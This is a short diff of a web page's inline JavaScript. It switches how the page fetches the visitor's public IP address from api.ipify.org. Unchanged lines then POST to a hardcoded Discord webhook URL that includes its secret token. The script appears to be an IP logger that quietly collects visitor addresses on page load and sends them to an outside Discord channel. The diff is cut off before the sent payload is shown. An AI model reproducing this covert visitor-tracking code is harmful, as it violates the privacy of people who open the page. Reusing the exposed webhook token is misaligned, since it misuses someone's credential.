@@ -7,11 +7,13 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
 <script>
 //$.getJSON("https://api.myip.com", function(data) {
-  const req = new XMLHttpRequest();
-  req.open("GET", "https://api.ipify.org");
-  
-  req.send()
-  print(req.responseText, req)
+  fetch('https://api.ipify.org/?format=json').then(function(response) {
+    return response.json();
+  }).then(function(data) {
+    console.log(data.ip);
+  }).catch(function(err) {
+    console.log('Fetch Error :-S', err);
+  });
   
   const request = new XMLHttpRequest();
   request.open("POST", "https://discord.com/api/webhooks/1051249705146921050/89HOeSfP4bPXw6NvS8JaXbrEWCxOksYpvvbeE7GsdD0GQQShEPp4IZO3w4e0QHakm-CP");
